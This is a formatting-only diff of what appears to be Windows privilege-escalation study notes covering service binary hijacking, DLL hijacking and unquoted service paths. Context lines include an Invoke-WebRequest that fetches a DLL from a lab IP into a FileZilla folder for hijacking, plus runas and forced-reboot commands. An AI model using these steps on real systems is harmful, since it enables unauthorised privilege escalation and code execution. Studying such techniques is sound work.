@@ -1040,6 +1040,7 @@ runas /user:backupadmin cmd
 ## Leveraging Windows Services
 
 ### Service Binary Hijacking
+---
 
 #### Get Running services
 ~~~ powershell
@@ -1117,7 +1118,7 @@ shutdown /r /t 0
 
 
 ### DLL Hijacking
-
+---
 
 #### C++ DLL example code from Microsoft
 
@@ -1164,6 +1165,7 @@ iwr -uri http://192.168.48.3/TextShaping.dll -OutFile 'C:\FileZilla\FileZilla FT
 
 
 ### Unquoted Service Paths
+---
 
 #### List of services with spaces and missing quotes in the binary path
 
